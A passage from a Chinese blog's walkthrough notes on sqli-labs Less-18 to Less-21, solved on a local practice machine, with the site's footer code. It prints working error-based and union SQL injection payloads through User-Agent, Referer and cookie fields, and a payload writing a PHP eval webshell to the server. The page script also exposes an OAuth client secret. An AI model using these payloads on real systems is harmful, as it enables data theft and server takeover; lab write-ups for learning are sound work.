+<p>作用：改变文档中符合条件的节点</p>
+<p>利用updatexml函数的报错机制进行注入，原理就是当第二个参数的格式和Xpath的格式不符的时候，就会产生报错，我们可以将我们的payload构造到第二个参数中，让其随着报错信息展示到页面上</p>
+<h2 id="Less-18-POST-Header-Injection-Uagent-field-Error-based"><a href="#Less-18-POST-Header-Injection-Uagent-field-Error-based" class="headerlink" title="Less-18: POST-Header Injection-Uagent field-Error based"></a>Less-18: POST-Header Injection-Uagent field-Error based</h2><p>请求头注入？<br>发现首页还真给出了我的IP信息：<br><img src="/2021/12/15/sqli-labs-Basic-Challenges/image-20211021185038552.png" alt="在这里插入图片描述"></p>
+<p>那就抓包。。。。看了一圈，发现请求头那里本身没有IP信息，要自己加？</p>
+<p>冲浪，发现有一个X-Forwarded-For字段，不就是以前伪造是管理员的CTF题吗？<br>试试X-Forwarded-For:127.0.0.1，发现没改到。。。。<br>那就先试试常规注入，发现也都不行<br>呃，冲浪</p>
+<p>如果成功登入会发现会会回显User Agent信息<br><img src="/2021/12/15/sqli-labs-Basic-Challenges/image-20211021185104651.png" alt="在这里插入图片描述"></p>
+<p>那就猜注入点在请求头中的User-Agent字段<br>这里要求先能正确登入，才能改User-Agent字段注入<br>对应现实中先先注册用户再登录，再注入<br>由于User-Agent字段是会显示在登录成功页面中的，于是猜测是不是也是先获取字段内容，然后嵌入到显示语句中？</p>
+<p>开始乱改，输入单引号：<br><em>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘10.10.10.1’, ‘dumb’)’ at line 1</em><br>看来有SQL语句<br>输入<code>’123213</code>：<br><em>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘123213’, ‘10.10.10.1’, ‘dumb’)’ at line 1</em><br>难道SQL报错的规律是从出错的地方一直到语句末尾？<br>那这个很像是插入语句。。。。（好吧其实我是看过做法了）<br>试试<code>1&#39;, &#39;123&#39;, &#39;hack&#39;) #</code>：<br><em>Your User Agent is: 1’, ‘123’, ‘hack’) #</em><br>呃</p>
+<p>冲浪，有如下的payload（updatexml注入）：<br><code>&#39; or updatexml(1, concat(0x7e, (select database()), 0x7e), 1) or &#39;</code></p>
+<p>爆表：<br><code>&#39; or updatexml(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema=database()), 0x7e), 1) or &#39;</code></p>
+<p>爆字段：<br><code>&#39; or updatexml(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;), 0x7e), 1) or &#39;</code></p>
+<p>爆内容：<br><code>&#39; or updatexml(1, concat(0x7e, (select group_concat(username) from users), 0x7e), 1) or &#39;</code><br>（注意用updatexml()只能查询32位，要用substr函数逐段查询）<br><code>&#39; or updatexml(1, concat(0x7e, substr((select group_concat(username) from users), 1, 32), 0x7e), 1) or &#39;</code><br><code>&#39; or updatexml(1, concat(0x7e, substr((select group_concat(username) from users), 32, 32), 0x7e), 1) or &#39;</code><br><code>&#39; or updatexml(1, concat(0x7e, substr((select group_concat(username) from users), 64, 32), 0x7e), 1) or &#39;</code></p>
+<p>或者这种payload：<br><code>&#39; or updatexml(1, concat(0x7e, substr((select group_concat(username) from users), 1, 32), 0x7e), 1), &#39;&#39;, &#39;&#39; ) #</code><br>猜出要插入多少段，主动闭合，然后最后注释</p>
+<h3 id="extractvalue-注入"><a href="#extractvalue-注入" class="headerlink" title="extractvalue()注入"></a>extractvalue()注入</h3><p>或者另一种注入：<strong>extractvalue注入</strong>——与updatexml类似</p>
+<p>extractvalue() :对XML文档进行查询的函数<br>语法：extractvalue(目标xml文档，xml路径)</p>
+<p>爆库：<br><code>&#39; or extractvalue(1, concat(0x7e, (select database()), 0x7e)) or &#39;</code></p>
+<p>爆表：<br><code>&#39; or extractvalue(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema=database()), 0x7e)) or &#39;</code><br><code>&#39; or extractvalue(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema=database()), 0x7e)), &#39;&#39;, &#39;&#39;)#</code></p>
+<p>下略</p>
+<h2 id="Less-19-POST-Header-Injection-Referer-field-Error-based"><a href="#Less-19-POST-Header-Injection-Referer-field-Error-based" class="headerlink" title="Less-19: POST-Header Injection-Referer field-Error based"></a>Less-19: POST-Header Injection-Referer field-Error based</h2><p>请求头注入——Referer字段<br>登陆成功后是这种东西：<br><img src="/2021/12/15/sqli-labs-Basic-Challenges/image-20211021185501917.png" alt="在这里插入图片描述"></p>
+<p>Referer字段改成单引号：<br><em>check the manual that corresponds to your MySQL server version for the right syntax to use near ‘10.10.10.1’)’ at line 1</em><br>猜测是上一题的insert，尝试<code>&#39;, &#39;&#39;, &#39;&#39;)#</code>：<br><em>Column count doesn’t match value count at row 1</em><br>emmm，看来列数有变。试出这样子不会报错：<code>&#39;, &#39;&#39;)#</code>，看来是插入两列</p>
+<p>爆库：<br><code>&#39; or updatexml(1, concat(0x7e, (select database()), 0x7e), 1), &#39;&#39;)#</code></p>
+<p>爆表：<br><code>&#39; or updatexml(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema=database()), 0x7e), 1), &#39;&#39;)#</code></p>
+<p>爆字段：<br><code>&#39; or updatexml(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;), 0x7e), 1), &#39;&#39;)#</code></p>
+<p>爆内容（注意使用substr函数分段查询）：<br><code>&#39; or updatexml(1, concat(0x7e, substr((select group_concat(username) from users), 32, 32), 0x7e), 1), &#39;&#39;)#root</code></p>
+<p>extractvalue()注入类似：<br><code>&#39; or extractvalue(1, concat(0x7e, (select database()), 0x7e)) or &#39;, &#39;&#39;) #</code></p>
+<p>下略</p>
+<h2 id="Less-20-POST-Cookie-injections-Uagent-field-Error-based"><a href="#Less-20-POST-Cookie-injections-Uagent-field-Error-based" class="headerlink" title="Less-20: POST-Cookie injections-Uagent field-Error based"></a>Less-20: POST-Cookie injections-Uagent field-Error based</h2><p>cookie注入？User-Agent字段<br>乱登录，好像没啥<br>dumb登录：<br><img src="/2021/12/15/sqli-labs-Basic-Challenges/image-20211021185634646.png" alt="在这里插入图片描述"><br>之后由于cookie值已保存，再次刷新也是这个页面<br>抓刷新的包，发现有发送过去的cookie——Cookie: uname&#x3D;Dumb<br>把uname改成dhakkan，呃，直接给出了对应的内容：<br><img src="/2021/12/15/sqli-labs-Basic-Challenges/image-20211021185657520.png" alt="在这里插入图片描述"></p>
+<p>如何利用cookie字段脱裤？<br>从传入名字会获取密码和id来看，猜测是类似于这样的结构：<br>select password,id from users where username&#x3D;$_COOKIE[‘uname’]<br>改单引号：<br><em>check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’’’ LIMIT 0,1’ at line 1</em><br>改成<code>‘ or 1=1 #</code>，通过，回显id&#x3D;1</p>
+<p>剩下的就是常规注入了<br><code>dumb&#39; order by 3 #</code><br><code>&#39; union select 1,2,3 #</code>——回显3、1字段<br><code>&#39; union select group_concat(table_name),2,database() from information_schema.tables where table_schema=database() #</code></p>
+<p>下略</p>
+<h2 id="Less-21-POST-Dump-into-outfile-String"><a href="#Less-21-POST-Dump-into-outfile-String" class="headerlink" title="Less-21: POST-Dump into outfile-String"></a>Less-21: POST-Dump into outfile-String</h2><p>大概和Less-7差不多吧，只是GET改POST，吧<br>乱登没结果<br>正确登入的界面和上一题差不多，但是用户名回显的是经过base64加密后的结果<br>然后试了试常规地改cookie的uname值为单引号啥的，发现不太行<br>是不是要传入base64加密后的cookie值？<br>于是传入base64加密后的单引号：<code>Jw==</code><br>发现成功报错：<br><em>check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’’’) LIMIT 0,1’</em><br>于是传入<code>&#39;) or 1=1 #</code>的base64加密，成功<br><img src="/2021/12/15/sqli-labs-Basic-Challenges/image-20211021185822604.png" alt="在这里插入图片描述"></p>
+<p>下面就是常规注入了，只不过payload都要经过base64加密<br>那么Dump into outfile呢？再次复习一遍好了<br>只不过这里的上传webshell应该也是通过cookie来注入<br>试试<code>?id=&#39;) union select 1,2,&#39;&lt;?php @eval($_POST[&quot;hack&quot;]);?&gt;&#39; into outfile &#39;/www/sqli-labs-master/shell.php&#39; #</code>的base64编码<br>呃：<br><em>Issue with your mysql: The MySQL server is running with the –secure-file-priv option so it cannot execute this statement</em><br>靶机就要有靶机的样子，去关掉了：MySQL配置文件添加：<code>secure_file_priv=</code><br>再次尝试上传，成功（有警告）<br>蚁剑连接，成功，但是同样只有www用户的权限</p>
+	
+		</div>
+		
+		<div id="current-post-cover" data-scr="/img/post-cover/rickroll.jpg"></div>
+
+		<!-- relate post, comment...-->
+		<div class="investment-container">
+			<div class="investment-header">
+				<div class="investment-title-1">
+					<div class="on">相关文章</div>
+					<div>评论</div>
+					<!-- <div>分享</div> -->
+				</div>
+				<div class="investment-title-2">	            
+					
+	<span>
+		<a id="totop-post-page">返回顶部</a>
+		
+			<a href="/2021/12/17/Web%E9%9D%B6%E5%9C%BA-Web-For-Pentester/" title="Web靶场-Web For Pentester" rel="prev">
+				&laquo;上一篇
+			</a>
+		
+		
+			<a href="/2021/12/10/Linux%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/" title="Linux环境变量" rel="next">
+				下一篇&raquo;
+			</a>
+			
+	</span>
+
+
+      		
+				</div>	
+			</div>
+			
+			<div class="investment-content">
+				<div class="investment-content-list">
+					
+
+<div class="relate-post">
+	
+		<ul>
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2023/06/04/Web%E9%9D%B6%E5%9C%BA-upload-labs/" title="Web靶场-upload-labs">
+								Web靶场-upload-labs			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								六月 4日, 2023				
+							</p>
+							<p class="relate-post-content">
+								环境攻击机：kali 10.10.10.128靶机：Debian 11.1 x64 
+Pass-01任务：上传一个webshell到服务器
+直接怼，显示：
+
+改成basic.jpg，点击上传后bp抓包，修改后缀为.php，上传成功了：...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2023/06/04/Web%E9%9D%B6%E5%9C%BA-upload-labs/" title="Web靶场-upload-labs">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/default.jpg" alt="Web靶场-upload-labs"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2023/05/04/PHP-Web%E6%B8%97%E9%80%8F%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E9%AB%98%E5%8D%B1%E5%87%BD%E6%95%B0%E4%BB%A5%E5%8F%8A%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="PHP-Web渗透中常见的高危函数以及伪协议">
+								PHP-Web渗透中常见的高危函数以及伪协议			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								五月 4日, 2023				
+							</p>
+							<p class="relate-post-content">
+								代码执行函数eval
+代码：&lt;?php @eval($_GET[&#39;cmd&#39;]);?&gt;
+利用：http://10.10.10.3/test.php?cmd=phpinfo();
+assert
+代码：&lt;?...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2023/05/04/PHP-Web%E6%B8%97%E9%80%8F%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E9%AB%98%E5%8D%B1%E5%87%BD%E6%95%B0%E4%BB%A5%E5%8F%8A%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="PHP-Web渗透中常见的高危函数以及伪协议">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/PHP.png" alt="PHP-Web渗透中常见的高危函数以及伪协议"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2023/05/01/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="Webshell流量分析">
+								Webshell流量分析			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								五月 1日, 2023				
+							</p>
+							<p class="relate-post-content">
+								菜刀一句话在这里：&lt;?php eval($_POST[&#39;myhack&#39;]) ?&gt;
+用的某个工具包里的菜刀，流量如下：
+
+agent有火狐5.0以及百度
+连接密码开头，用了array_map封装命令执行函数，...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2023/05/01/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="Webshell流量分析">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/oiiai.jpg" alt="Webshell流量分析"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2023/03/30/sqli-labs-Stacked-Injections/" title="sqli-labs Stacked Injections">
+								sqli-labs Stacked Injections			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								三月 30日, 2023				
+							</p>
+							<p class="relate-post-content">
+								[NOTE] sqli-labs Stacked Injections前言针对sqli-labs靶场的做题笔记
+环境虚拟机环境攻击机：kali | 10.10.10.1靶机：Debian 11.1 | 10.10.10.3 | Apa...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2023/03/30/sqli-labs-Stacked-Injections/" title="sqli-labs Stacked Injections">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/rickroll.jpg" alt="sqli-labs Stacked Injections"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2022/10/25/Web%E9%9D%B6%E5%9C%BA-DSVW/" title="Web靶场-DSVW">
+								Web靶场-DSVW			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								十月 25日, 2022				
+							</p>
+							<p class="relate-post-content">
+								[NOTE] DSVW靶场练习笔记前言是针对DSVW靶场的练习笔记是在搞完Pikachu靶场之后在整理vulnstack的Web安全入门进阶靶场时发现的里面版本比较老，就单独搞出来玩玩
+最新版本v0.2b用Python 3运行代码很顶...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2022/10/25/Web%E9%9D%B6%E5%9C%BA-DSVW/" title="Web靶场-DSVW">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/default.jpg" alt="Web靶场-DSVW"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/" title="Web靶场-Pikachu">
+								Web靶场-Pikachu			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								十月 6日, 2022				
+							</p>
+							<p class="relate-post-content">
+								[NOTE] Pikachu靶场练习笔记前言是针对Pikachu靶场的练习笔记是在搞完WebGoat之后想着再找一个靶场玩玩
+环境攻击者：Kali Linux | 10.10.10.1靶机：Ubuntu | 10.10.10.2 | ...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/" title="Web靶场-Pikachu">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/default.jpg" alt="Web靶场-Pikachu"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2022/05/10/%E4%B8%80%E4%BA%9BBurpSuite%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8/" title="一些BurpSuite进阶使用">
+								一些BurpSuite进阶使用			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								五月 10日, 2022				
+							</p>
+							<p class="relate-post-content">
+								[NOTE] Burp Suite进阶前言目前只是些平时练习过程中接触到的BP进阶使用方法和技巧
+后续再考虑找些专门的教程学学
+使用宏抓取页面token下面以抓取pikachu靶场爆破模块的token为例
+来自于g0tmi1k的文章
+...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2022/05/10/%E4%B8%80%E4%BA%9BBurpSuite%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8/" title="一些BurpSuite进阶使用">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/burpsuite.png" alt="一些BurpSuite进阶使用"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2022/01/13/SQL%E4%B8%8Esqlmap/" title="SQL与sqlmap">
+								SQL与sqlmap			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								一月 13日, 2022				
+							</p>
+							<p class="relate-post-content">
+								[NOTE] SQL与sqlmapSQL语法order by
+
+对查询结果排序
+ASC：升序（默认）、DESC：降序
+SQL注入中多在成功查询之后添加order by i来猜解回显的字段数
+如XXX/?id=1&#39; order ...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2022/01/13/SQL%E4%B8%8Esqlmap/" title="SQL与sqlmap">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/rickroll.jpg" alt="SQL与sqlmap"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2021/12/18/sqli-labs-Adv-Injections/" title="sqli-labs Adv Injections">
+								sqli-labs Adv Injections			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								十二月 18日, 2021				
+							</p>
+							<p class="relate-post-content">
+								[NOTE] sqli-labs Adv Injections前言针对sqli-labs靶场的做题笔记
+环境虚拟机环境攻击机：kali|10.10.10.1靶机：ubuntu|10.10.10.2|Apache+PHP+MySQL
+L...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2021/12/18/sqli-labs-Adv-Injections/" title="sqli-labs Adv Injections">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/rickroll.jpg" alt="sqli-labs Adv Injections"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2021/12/17/Web%E9%9D%B6%E5%9C%BA-Web-For-Pentester/" title="Web靶场-Web For Pentester">
+								Web靶场-Web For Pentester			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								十二月 17日, 2021				
+							</p>
+							<p class="relate-post-content">
+								[NOTE] Web For Pentester靶场练习笔记前言搞完XVWA之后
+环境hacker: Kali Linux | 192.168.10.1&#x2F;10.10.10.1server: Debian 6 | 192.16...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2021/12/17/Web%E9%9D%B6%E5%9C%BA-Web-For-Pentester/" title="Web靶场-Web For Pentester">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/default.jpg" alt="Web靶场-Web For Pentester"/>
+							</a>
+						</div>
+					</li>												
+			
+		</ul>
+	
+</div>	
+				</div>
+				<div class="investment-content-list">
+					<div class="layout-comment">
+
+	
+
+		
+
+			<!-- gitalk comment -->
+			<!-- show gitalk comment -->
+<div id="gitalk-container"></div>
+
+<!-- gitalk`s css & js -->
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<link rel="stylesheet" href="/css/comment.css">
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<script type="text/javascript">
+
+	(function gitalkComment(){
+		//Thanks O-R
+		//https://github.com/gitalk/gitalk/issues/102#issuecomment-382970552
+		//去除尾部匹配正则数组的字符串  
+		//Remove redundant characters
+		String.prototype.trimEnd = function(regStr) {
+			let result = this;
+			if(regStr == undefined || regStr == null || regStr == "") {
+				return result;
+			}
+			let array = regStr.split(',');
+
+			if(array.length > 0) {
+
+				let c = array.shift(), 
+					str = this,
+					i = str.length,
+					rg = new RegExp(c),
+					matchArr = str.match(rg);
+
+				if(matchArr != undefined && matchArr != null && matchArr.length > 0) {
+					let matchStr = matchArr[0].replace(/\\/g, "\\\\").replace(/\*/g, "\\*")
+						.replace(/\+/g, "\\+").replace(/\|/g, "\\|")
+						.replace(/\{/g, "\\{").replace(/\}/g, "\\}")
+						.replace(/\(/g, "\\(").replace(/\)/g, "\\)")
+						.replace(/\^/g, "\\^").replace(/\$/g, "\\$")
+						.replace(/\[/g, "\\[").replace(/\]/g, "\\]")
+						.replace(/\?/g, "\\?").replace(/\,/g, "\\,")
+						.replace(/\./g, "\\.").replace(/\&/g, "\\&");
+					matchStr = matchStr + '$';
+					result = str.replace(new RegExp(matchStr), "");
+				}
+
+				if(array.length > 0) {
+					return result.trimEnd(array.join())
+				} else {
+					return result;
+				}
+			}
+		};
+
+		//Create gitalk
+		let gitalk = new Gitalk({
+			clientID: 'Ov23liAb4iwJ1VAXeknf',
+			clientSecret: 'dbb92e8b0d3419b2a395abc8331a12e38e330e6c',
+			//id: window.location.pathname,
+			//id: decodeURI(window.location.pathname),
+			//id: (window.location.pathname).split("/").pop().substring(0, 49),
+			id: decodeURI( md5( location.href.trimEnd('#.*$,\\?.*$,index.html$') ) ),
+			repo: 'Blog-Gitalk',
+			owner: 'ArcheriShade',
+			admin: 'ArcheriShade',
+			distractionFreeMode: 'true',
+		})
+		gitalk.render('gitalk-container');		
+	})();
+</script>
+
+		
+		
+	
+
+</div>
+				</div>
+				<!-- <div class="investment-content-list">
+					<div class="layout-share">
+	
+	
+		<div class="config-info">
+			Please check the parameter of <b>comment</b> in config.yml of hexo-theme-Annie!
+		</div>	
+	
+</div>
+
+
+				</div> -->
+			</div>	
+		</div>
+	</div>
+</div>
+
+<!-- show math formula -->
+
+
+
+	 
+	
+<script src="/plugin/clipboard/clipboard.js"></script>
+
+	<script>
+		// Copy code !
+	    function preprocessing() {
+	        $("#article-content .highlight").each(function() {
+	            $(this).wrap('<div id="post-code"></div>');
+	        })
+
+	        $("#article-content #post-code").each(function() {
+	            $(this).prepend('<nav class="copy-nav"><span><i class="code-language"></i></span></nav>');
+	        })
+
+	        $("#article-content .copy-nav").each(function() {
+	            let languageClass = $(this).next().attr('class'),
+	                language = ((languageClass.length > 9) && (languageClass != null)) ? languageClass.substr(10) : "none"; //why 9? Need to check language?
+
+	            $(this).find('.code-language').text(language);
+	            $(this).append('<span class="copy-btn icon-paste"></span>');
+	        });
+	    }
+
+		function copy() {
+		    $('#article-content #post-code').each(function(i) {
+		        let codeCopyId = 'codeCopy-' + i;
+
+		        let codeNode = $(this).find('.code'),
+		            copyButton = $(this).find('.copy-btn');
+
+		        codeNode.attr('id', codeCopyId);
+		        copyButton.attr('data-clipboard-target-id', codeCopyId);
+		    })
+   
+			let clipboard = new ClipboardJS('.copy-btn', {
+					target: function(trigger) {
+						return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+					}
+		      	});
+
+			//pure js
+			function showTooltip(elem, msg) {		   
+				elem.setAttribute('aria-label', msg);
+				elem.setAttribute('class', 'copy-btn icon-clipboard1');
+				setTimeout(function() {
+					elem.setAttribute('class', 'copy-btn icon-paste');
+				}, 2000);
+			}
+
+			clipboard.on('success', function(e) {
+			    e.clearSelection();
+			    console.info('Action:', e.action);		   
+			    console.info('Trigger:', e.trigger);
+			    showTooltip(e.trigger, 'Copied!');   
+			});
+			
+			clipboard.on('error', function(e) {
+			    console.error('Action:', e.action);
+			    console.error('Trigger:', e.trigger);
+			});
+		}
+		
+		(function copyCode(){
+			if ($('.layout-post').length) {
+			    preprocessing();
+			    copy();
+			} 
+		})();
+	</script>
+
+
+
+
+
+
+<link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+
+
+<script src="/plugin/fancybox/jquery.fancybox.js"></script>
+
+
+<script type="text/javascript">
+	(function gallerySet(){
+		let titleID = $('.article-title a'),
+			imageID = $('.article-content img'),
+			videoID = $('.article-content video');
+		
+		let postTitle = titleID.text() ? titleID.text() : "No post title!";
+		
+		imageID.each(function() {
+			let imgPath = $(this).attr('src'),
+				imgTitle = $(this).attr('alt') ? $(this).attr('alt') : "No image description!";
+		
+			//给每个匹配的<img>元素打包, 即添加父元素<a>
+			$(this).wrap('<a data-fancybox="gallery" data-caption="《 ' + postTitle + ' 》' + imgTitle + '"href="' + imgPath + '"> </a>');
+		});
+		
+		videoID.each(function() {
+			let videoPath = $(this).attr('src');
+		
+			//给每个匹配的<img>元素打包, 即添加父元素<a>
+			$(this).wrap('<a data-fancybox href=" ' + videoPath + ' "> </a>');
+		});
+		
+		//TODO：支持html5 video
+
+		if($('#layout-post').length) {
+			$('[data-fancybox="gallery"]').fancybox({
+				loop: true,
+				buttons: [
+					"zoom",
+					"share",
+					"slideShow",
+					"fullScreen",
+					//"download",
+					"thumbs",
+					"close"
+				],
+				protect: true
+			});
+		}
+	})();
+</script>
+		</main>
+
+		<!--footer-->
+		<footer>
+	<div id="navigation-show">
+		<ul id="global-nav">
+	
+		<li class="menu-home">
+			<a href="/" class="menu-item-home" target="_blank">主页</a>
+		</li>
+		
+	
+		<li class="menu-archive">
+			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
+		</li>
+		
+	
+		<li class="menu-categories">
+			<a href="/categories" class="menu-item-categories" target="_blank">分类</a>
+		</li>
+		
+	
+		<li class="menu-tags">
+			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
+		</li>
+		
+	
+		<li class="menu-about">
+			<a href="/about" class="menu-item-about" target="_blank">关于</a>
+		</li>
+		
+	
+		<li class="menu-gallery">
+			<a href="/gallery" class="menu-item-gallery" target="_blank">相册</a>
+		</li>
+		
+	
+
+	
+		<li class="menu-search">
+			<a href="javascript:;" class="popup-trigger">搜索</a>
+		</li>
+	
+</ul>
+	</div>
+
+	<div class="copyright">
+		<p>
+			 
+				&copy;2024, content by ArcheriShade. All Rights Reserved.
+			
+			
+				<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay.
+			
+		</p>
+		<p>
+			
+
+	<!-- busuanzi -->
+	<!-- busuanzi -->
+
+
+
+			<a href="javascript:zh_tran('s');" class="zh_click" id="zh_click_s">简体</a> 
+			<a href="javascript:zh_tran('t');" class="zh_click" id="zh_click_t">繁體</a>				
+		</p>
+	</div>		
+</footer>
+		
+	<!-- Local or hitokoto! -->
+
+	
+<script src="/plugin/motto/motto.js"></script>
+
+	
+	<script type="text/javascript">
+		(function motto(){
+			let mottoText = getMingYanContent().split('</br> - </br>'),
+			
+			mottoTextContent = mottoText[0]?mottoText[0]:'请刷新...',
+			
+			mottoTextFrom = mottoText[1]?mottoText[1]:'one/一个';
+			
+			mottoTextContent = mottoTextContent.trim().substring(0, 100);
+		
+			$("#motto-content").html( mottoTextContent);
+			$("#motto-author").html( mottoTextFrom  );
+		})();	
+	</script>	
+
+
+
+<!-- love effect -->
+
+
+<!-- back to top -->
+
+	<div id="totop">
+	<span class="icon-circle-up"></span>
+</div>
+
+
+
+<!-- site analysis -->
+
+
+	<!-- site-analysis -->
+	
+	
+	
+	
+	
+ 
+
+<!-- leancloud -->
+
+
+	<!-- leancloud -->
+	<!--
+	时间：2018-11-27
+	描述：
+		文章访问量：visitors
+		文章喜欢量：likes	
+		文章排行榜：topNPost
+		其他得说明：
+			01-Cookie相关的函数 
+				https://blog.csdn.net/somehow1002/article/details/78511541（Author：somehow1002）
+			02-visitors相关的函数 
+				https://blog.csdn.net/u013553529/article/details/63357382（Author：爱博客大伯）
+				https://notes.doublemine.me/2015-10-21-为NexT主题添加文章阅读量统计功能.html（Author：夏末）
+			03-topNPost相关的函数
+				https://hoxis.github.io/hexo-next-read-rank.html（Author：hoxis）
+			04-likes相关的函数，
+				参考了01 & 02进行简单的设计与实现
+-->
+
+
+	
+
+  
+
+	<!--
+	时间：2018-10-3
+	描述：
+		插件名称：hexo-generator-search-zip
+		插件来源: https://github.com/SuperKieran/hexo-generator-search-zip
+		代码参考：https://github.com/SuperKieran/TKL/blob/master/layout/_partial/search.ejs(Include: js & css)	
+-->
+<div class="popup search-popup local-search-popup scrollbar" >
+	<div class="local-search-container">
+		<span class="popup-btn-close">
+      		ESC
+   		</span>
+		<div class="local-search-header">
+			<div class="input-prompt">				
+			</div>
+			<input autocomplete="off" placeholder="Search..." type="text" id="local-search-input">
+		</div>
+		<div class="local-search-body">
+			<div id="local-search-output"></div>
+		</div>
+		<div class="local-search-footer">
+			<div class="topN-post">				
+				
+								
+			</div>
+		</div>
+	</div>
+</div>
+
+
+<script src="/plugin/search/ziploader.js"></script>
+<script src="/js/search.js"></script>
+
+
+<script type="text/javascript">
+	var search_path = 'search.json',
+		zip_Path = '/search.zip',
+		version_Path = '/searchVersion.txt',
+		input_Trigger = 'auto',
+		top_N = '2';
+
+	themeLocalSearch({
+		search_path, 
+		zip_Path, 
+		version_Path, 
+		input_Trigger, 
+		top_N
+	});
+</script>
+
+
+
+<script src="/plugin/chinese/chinese.js"></script>
+<script src="/plugin/imagelazyloader/yall.min.js"></script>
+<script src="/plugin/imageloaded/imagesloaded.pkgd.min.js"></script>
+<script src="/plugin/nicescroll/jquery.nicescroll.js"></script>
+<script src="/plugin/resizediv/resizediv.js"></script>
+<script src="/js/main.js"></script>
+
+	</body>	
+</html>
